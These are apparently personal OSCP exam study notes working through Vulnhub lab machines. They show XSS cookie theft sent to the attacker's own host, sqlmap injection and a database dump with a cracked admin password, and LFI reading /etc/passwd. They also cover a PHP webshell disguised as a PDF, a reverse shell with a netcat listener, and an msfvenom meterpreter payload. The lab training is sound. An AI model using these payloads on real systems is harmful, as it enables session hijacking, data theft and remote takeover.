---
title: OSCP Study Notes - 2021/03/12
date: 2021-03-12 13:22:27
tags: [OSCP, Study Notes]
---

Vulnhub Box: [XSS & MySQL FILE](https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/)


# Cross-Site Scripting
Find the IP address using netdiscover: `192.168.119.134`

Test by add to box
```
<script>alert("helloxss")</script>
```

Create a php script:
``` php
<?php
$cookie = isset($_GET["test"]) ?$_GET["test"]:"";
?>
```
Start a php server:
```
service apache2 stop
php -S 192.168.119.132:80
# -S <addr>:<port> Run with built-in web server.
```

Inject javascript to comment box:
```
<script>location.href='http://192.168.119.132/index.php?test='+document.cookie;</script>
```
Then get a bounch of cookies:
```
[Fri Mar 12 14:06:59 2021] 192.168.119.134:37106 [200]: GET /index.php?test=PHPSESSID=h576adtob2huvem6m28ndk6lm5
[Fri Mar 12 14:06:59 2021] 192.168.119.134:37106 Closing
[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 Accepted
[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 [200]: GET /index.php?test=PHPSESSID=k0u7iarj89i203m84udm5ve7r5
[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 Closing
[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 Accepted
[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 [200]: GET /index.php?test=PHPSESSID=ioephhq6n3efntimq0nb2hfv26
[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 Closing
[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 Accepted
[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 [200]: GET /index.php?test=PHPSESSID=56lch59vt5c10o40lutelou564
[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 Closing
[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 Accepted
[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 [200]: GET /index.php?test=PHPSESSID=tal24ib05acs49vaf2i39r6jh7
[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 Closing
[Fri Mar 12 14:11:59 2021] 192.168.119.134:37126 Accepted
```

Download Cookie_manager_plus plugin  
add the cookie, refresh and open click the admin  

Login as admin !!

# SQL Injection
Go to the login page  

Check the Sql injection cheat sheet, search Pentest lab sql injection cheat sheet  
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/  


## Potential Sql injection position:
```
192.168.119.134/post.php?id=3
```
`?id=3`

## Lets try sqlmap first
**not allowed in the exam**  

```
sqlmap -u "192.168.119.134/post.php?id=1"
[15:04:32] [WARNING] GET parameter 'id' does not seem to be injectable
```

or 
```
sqlmap -u "http://192.168.119.134/admin/edit.php?id=1" --cookie=PHPSESSID=79fi4mj2s3lq39p0fmdmnpdpd1
```
if know the cookie
```
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 7510=7510

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5982 FROM (SELECT(SLEEP(5)))lOqF)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-9410 UNION ALL SELECT NULL,NULL,CONCAT(0x7171706a71,0x716c664c74636976635573484b575956527471614e56527a524b527a4a76687a4a78454267716675,0x7171787871),NULL-- -
---
```
Dump the databse:
```
sqlmap -u "http://192.168.119.134/admin/edit.php?id=1" --cookie=PHPSESSID=79fi4mj2s3lq39p0fmdmnpdpd1 --dump
[15:24:33] [INFO] cracked password 'P4ssw0rd' for user 'admin'                                                      
Database: blog                                                                                                      
Table: users
[1 entry]
+----+-------+---------------------------------------------+
| id | login | password                                    |
+----+-------+---------------------------------------------+
| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+----+-------+---------------------------------------------+

+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+
| id | post_id | text                                                                                             | title   | author  | published |
+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+
| 1  | 2       | <script>alert("XSS")</script>                                                                    | <blank> | <blank> | NULL      |
| 2  | 2       |         <script>location.href='http://192.168.119.132/index.php?test='+document.cookie;</script> | <blank> | <blank> | NULL      |
| 3  | 3       |         rt                                                                                       | df      | df      | NULL      |
| 4  | 3       |         <script>location.href='http://192.168.119.132/index.php?test='+document.cookie;</script> | <blank> | <blank> | NULL      |
| 5  | 1       |         <script>location.href='http://192.168.119.132/index.php?test='+document.cookie;</script> | <blank> | <blank> | NULL      |
+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+
```
try login page:
```
sqlmap -u "http://192.168.119.134/admin/login.php" --data="user=hello&password=23c"
```


# Local File Inclusion
Vulhunb: https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/

Use nikto:
```
nikto -h 192.168.119.135

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.119.135
+ Target Hostname:    192.168.119.135
+ Target Port:        80
+ Start Time:         2021-03-12 20:47:51 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.16 (Debian)
+ Retrieved x-powered-by header: PHP/5.3.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.16 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php: PHP include error may indicate local or remote file inclusion is possible.
+ OSVDB-3126: /submit?setoption=q&option=allowed_ips&value=255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 3472, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 8725 requests: 0 error(s) and 23 item(s) reported on remote host
+ End Time:           2021-03-12 20:48:20 (GMT-5) (29 seconds)
```
but found
```
http://192.168.119.13(5/index.php?page=../../../../../../../../../../etc/passwd%00
```
not be able to scan anything, 


Create a pdf file
``` php
%PDF-1.4
<?php
    system($_GET["cmd"]);
?>
```
the file goes to upload folder **how to know that?**

```
http://192.168.119.135/index.php?page=uploads/shell.pdf%00&cmd=whoami
```
%00 tell php ignore following content

### php reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php  

add `%PDF-1.4` to make it looks like a pdf file    
modify ip and port in the script  

```
nc -nvlp 4444
```

get the shell now  
next step: privielege escalation  
find a folder you have full control  


# Remote File Inclusion
create malicious payload
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.119.132 LPORT=444 >> exploit.php
```
## Host a file
```
service apache2 stop
cd /var/www/html 
python -m SimpleHTTPServer 80
```
this one need to use metasploit handler to receive connection, so maybe use php-reverse-shell for exam  

```
use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
set LHOST 192.168.119.132
set LPORT 4444
```

## Other things:
find a good blog: [My journey through OSCP](https://netosec.com/my-journey-through-oscp/)
